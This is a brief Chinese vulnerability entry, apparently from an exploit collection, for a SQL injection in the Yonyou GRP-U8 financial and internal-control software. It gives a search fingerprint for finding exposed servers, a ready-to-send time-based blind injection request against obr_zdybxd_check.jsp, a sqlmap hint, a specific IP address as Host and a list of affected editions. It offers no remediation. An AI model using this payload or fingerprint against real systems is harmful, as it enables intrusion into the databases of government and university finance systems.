# 用友GRP-U8obr_zdybxd_checksql注入

- **系统**：用友　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="用友GRP-U8 OA"`
- **请求**：`GET /u8qx/obr_zdybxd_check.jsp?mlid=1%27%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1`
- **关键头**：`Host: 1.14.47.145:81`

**请求体 / payload**
```

sqlmap
/u8qx/obr_zdybxd_check.jsp?mlid=1
```

**其他**
- 用友GRP-U8 obr\_zdybxd\_check sql注入: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友GRP-U8 行政事业内控管理软件（新政府会计制度专版）
* 用友GRP-U8 高校内控管理软件（Manager版）